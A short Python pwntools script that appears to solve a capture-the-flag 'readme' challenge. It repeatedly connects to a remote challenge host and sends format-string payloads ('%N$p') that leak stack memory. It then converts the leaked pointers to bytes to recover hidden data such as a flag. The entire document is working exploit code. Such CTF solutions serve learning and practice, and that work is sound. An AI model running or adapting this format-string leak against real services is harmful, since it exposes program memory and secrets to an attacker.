from pwn import *

data_lst = []
for i in range(1, 30):
	r = remote('dctf-chall-readme.westeurope.azurecontainer.io', 7481)
	r.sendline(f'%{i}$p')
	r.recvuntil("hello ")
	data_leak = r.recvline()[:-1]
	if(data_leak != b'(nil)'):
		data_lst.append(data_leak.decode())
for hexchar in data_lst:
	print(p64(int(hexchar, 16)))